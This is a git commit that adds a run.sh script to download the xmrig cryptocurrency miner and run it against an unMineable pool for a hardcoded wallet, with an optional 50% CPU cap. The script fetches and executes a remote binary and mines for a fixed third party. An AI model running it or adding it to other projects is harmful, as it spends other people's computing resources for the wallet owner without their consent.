5b5fa831b13d373efee189b24778a7b2dd5066b8
Leonardo <30982080+ForX72@users.noreply.github.com>
2023-08-31 16:56:25 +0200

    Update run.sh
    body

--- run.sh
+++ run.sh
@@ -1,1 +1,15 @@
+#download xmrig
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-focal-x64.tar.gz
+#unzip it
+tar -xf xmrig-*.tar.gz
+#get out the box the tool
+mv xmrig-6.20.0/xmrig ./xmrig
+#remove the trash
+rm -rf xmrig-6.20.0*
+#run the tool
+./xmrig -a rx -o stratum+ssl://rx-eu.unmineable.com:443 -u LINK:0xec70E5305082EFF3B71457a5eAf796E27ef54AF5.vm#bgoa-ss27 -p x --donate-level=0
+#otherwise run with 50% CPU usage
+#./xmrig -a rx -o stratum+ssl://rx-eu.unmineable.com:443 -u LINK:0xec70E5305082EFF3B71457a5eAf796E27ef54AF5.vm#bgoa-ss27 -p x --max-cpu-usage 50 --donate-level=0
+#
+#https://github.com/ForX72/xmrigScript
 #
